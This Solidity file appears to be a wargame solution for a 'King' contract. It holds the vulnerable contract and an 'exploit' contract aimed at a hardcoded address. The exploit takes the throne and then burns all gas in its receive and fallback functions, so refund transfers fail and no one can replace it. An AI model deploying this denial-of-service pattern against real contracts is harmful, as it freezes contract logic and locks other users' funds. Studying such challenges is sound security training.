// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract exploit{
    address payable king = payable(0x2C8D4bAa57d774CDef5a283Ce518D55f6aF0b13B);
    function sendeth() payable public {
        // king.transfer(msg.value);
        // return success;

        (bool success,) = king.call{value: msg.value}("");
        require(success);
    }
    fallback() external payable{
        for(uint i = 0; i <= 100000000000; i++){
          2 + 2;
        }
    }
    receive() external payable{
        for(uint i = 0; i < 1000000000000000; i++){
          2 + 2;
        }
    }
}